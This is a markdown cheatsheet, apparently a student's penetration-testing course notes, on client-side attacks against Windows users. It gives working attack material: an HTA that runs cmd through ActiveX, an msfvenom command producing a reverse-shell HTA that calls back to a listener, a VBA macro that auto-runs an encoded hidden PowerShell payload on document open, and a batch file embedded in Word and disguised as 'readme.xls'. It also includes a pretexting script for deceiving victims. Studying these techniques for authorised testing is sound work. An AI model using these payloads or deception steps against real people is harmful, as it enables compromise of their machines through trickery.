---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# active-information-gathering

backlinks: [[snippets-bash]]

sources:
- <https://github.com/danielmiessler/SecLists>
  
- Client side attacks
  - Information gathering
    - Passive client information
    - Active client information
    - Social engineering
      - pretexting by sending malformed word document and wait for victim to call. Then ask Ive got some advanced features in my resume, what version of office are you using? What OS?
    - Client fingerprinting by getting the victim to browse to our web page and executing a payload
      - FingerPrintjs2 ```shell sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip```
  - HTML applications .hta (only targets IE and sometimes Edge) and requires the victim to open the file and allow it to run on the device
    - uses activex objects to execute code inside a script tag
    - mshta.exe
    - ```html <html><head><script> var c='cmd.exe'; new ActiveXObject('Wscript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>```
    - generate payload with msfvenom ```shell sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta```
      - ![Alt text](kb/offsec/pen200/13-ClientSideAttacks/image.png)
  - Microsoft Office
    - Word Macro in VBA (must be saved as .docm or .doc NOT .docx )
    - requires user to active macro by clicking enable "enable content"
    - if the document name doesn't change and the user has already clicked enable content, they will not be reprompted.
    - vba has a limit of 255 characters for string literals so needs to be broken up
    ```python 
      str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....." 
      n = 50
      for i in range(0, len(str), n):
      print "Str = Str + " + '"' + str[i:i+n] + '"'
      ```
    - ```vb
      Sub MyMacro()
        ` CreateObject("Wscript.Shell").Run "cmd"
        Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
        Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
        Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
        Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
        Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
        Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
        ...
        Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
        Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
        Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
        Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
        Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
        Str = Str + "QA="

        CreateObject("Wscript.Shell").Run Str
      End Sub
      Sub AutoOpen()
        MyMacro
      End Sub
      Sub Document_Open()
        MyMacro
      End Sub
      ```
  - Object Linking and Embedding
    - embedding batch files inside a word document
      - launch.bat ```cmd START cmd.exe```
        - alernatively use powershell as well ```shell START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....```
      - Word -> Insert -> Object -> Create from file -> launch.bat
      - Change the icon and caption to something like readme.xls
      - victim needs to dbl click on the readme.xls document and run the bat file
  - Evading protected view
    - which disables all editing and modifications in the document and blocks the execution of macros or embedded objects
    - Microsoft Publisher allows embedded objects just like word or excel but will not enable protected view for internet delivered documnets
      - requires publisher installed on the victims device
